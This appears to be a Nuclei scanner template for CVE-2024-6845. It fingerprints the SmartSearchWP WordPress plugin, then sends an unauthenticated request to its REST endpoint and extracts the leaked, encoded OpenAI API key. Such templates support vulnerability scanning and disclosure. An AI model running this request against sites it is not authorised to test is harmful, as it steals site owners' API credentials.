id: CVE-2024-6845

info:
  name: SmartSearchWP < 2.4.6 - Unauthenticated OpenAI Key Disclosure
  author: s4e-io
  severity: medium
  description: |
    The plugin does not have proper authorization in one of its REST endpoint, allowing unauthenticated users to retrieve the encoded key and then decode it, thereby leaking the OpenAI API key.
  remediation: Fixed in 2.4.6
  reference:
    - https://cvefeed.io/vuln/detail/CVE-2024-6845
    - https://wpscan.com/vulnerability/cfaaa843-d89e-42d4-90d9-988293499d26/
  metadata:
    max-request: 2
    verified: true
    vendor: webdigit
    product: smartsearchwp
    framework: wordpress
    publicwww-query: "/wp-content/plugins/smartsearchwp"
    fofa-query: body="/wp-content/plugins/smartsearchwp"
  tags: cve,cve2024,info-leak,wordpress,wp-plugin,smartsearchwp,wpscan

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/smartsearchwp/readme.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body,"Chatbot with ChatGPT Wordpress")'
          - 'contains(content_type,"text/plain")'
          - 'status_code == 200'
        condition: and
        internal: true

  - raw:
      - |
        POST /wp-json/wdgpt/v1/api-key HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"key": "U2FsdGVkX1+X"}

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type,"application/json")'
          - 'status_code == 200'
        condition: and

    extractors:
      - type: regex
        part: body
        name: api-key
        regex:
          - '"([^"]+)"'
